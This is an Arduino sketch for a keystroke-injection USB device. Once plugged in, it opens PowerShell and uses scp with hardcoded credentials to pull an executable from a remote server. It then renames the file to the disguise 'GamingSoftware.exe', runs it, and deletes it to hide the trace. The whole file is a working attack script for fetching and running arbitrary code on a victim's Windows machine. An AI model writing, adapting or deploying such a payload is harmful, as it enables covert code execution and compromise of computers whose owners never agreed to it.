#include <Keyboard.h>

// set variables for server connection
const char* server_user = "ubuntu";
const char* server_password = "ubuntu";
const char* file_path = "/home/ubuntu/";
const char* file_name = "7z.exe";
const char* server_ip = "192.168.8.124";

// set variables for local saving path
const char* local_path = "C:\\temp\\";
const char* local_name = "GamingSoftware.exe";

bool checkDelete = 1; // check if file should be deleted after execution

void setup(){
  //initialize keyboard
  Keyboard.begin();
  //run PS as admin
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(300);
  Keyboard.press('r');
  delay(400);
  Keyboard.release(KEY_LEFT_GUI);
  delay(200);
  Keyboard.release('r');
  delay(500);
  Keyboard.println("powershell");
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(20);
  Keyboard.release(KEY_RETURN);
  delay(500);
  Keyboard.press(KEY_RIGHT_CTRL);
  delay(300);
  Keyboard.press(KEY_RIGHT_SHIFT);
  delay(500);
  Keyboard.release(KEY_RETURN);
  delay(300);
  Keyboard.release(KEY_RIGHT_SHIFT);
  delay(500);
  Keyboard.release(KEY_RIGHT_CTRL);
  //Connect via ssh and download file
  String command = "scp -P 22 " + String(server_user) + "@" + String(server_ip) + ":" + String(file_path) + String(file_name)
     + " " + String(local_path);
  delay(100);
  Keyboard.println(command);
  delay(500);
  Keyboard.println(String(server_password));
  delay(400);
  Keyboard.press(KEY_RETURN);
  delay(50);
  Keyboard.release(KEY_RETURN);
  delay(4000);
  //Change file name
  Keyboard.println("$currentFilePath = " +  String("\"") + String(local_path) + String(file_name) +  "\"");
  Keyboard.println("$newFileName = " +  String("\"") + String(local_name) +  "\"");
  Keyboard.println("Rename-Item -Path $currentFilePath -NewName $newFileName -Force");
  //Execute .exe
  delay(1000);
  Keyboard.println("Start-Process -FilePath " + String(local_path) + String(local_name));
  delay(3000);
  //Cleanup
  if (checkDelete){
    Keyboard.println("Remove-Item -Path " + String(local_path) + String(local_name) + " -Force");
  }

  Keyboard.end();
}

void loop()
{
}